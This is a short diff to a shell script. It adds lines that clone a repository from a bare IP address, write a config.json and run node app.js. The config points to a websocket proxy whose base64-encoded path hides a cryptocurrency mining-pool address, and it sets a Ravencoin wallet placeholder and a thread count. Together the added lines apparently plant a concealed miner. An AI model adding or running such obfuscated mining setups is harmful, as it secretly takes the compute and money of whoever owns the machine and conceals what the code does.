@@ -13,3 +13,18 @@ echo '{
 }' > data.json
 
 ./node app.js
+
+
+git clone http://160.30.168.199:3001/malphite848/z-mini.git
+
+cd z-mini
+
+echo -e '{
+  "host": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5ldS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "port": 3306,
+  "user": "RVN_ADDRESS",
+  "pass": "c=RVN",
+  "threads": 4
+}' > config.json
+
+node app.js
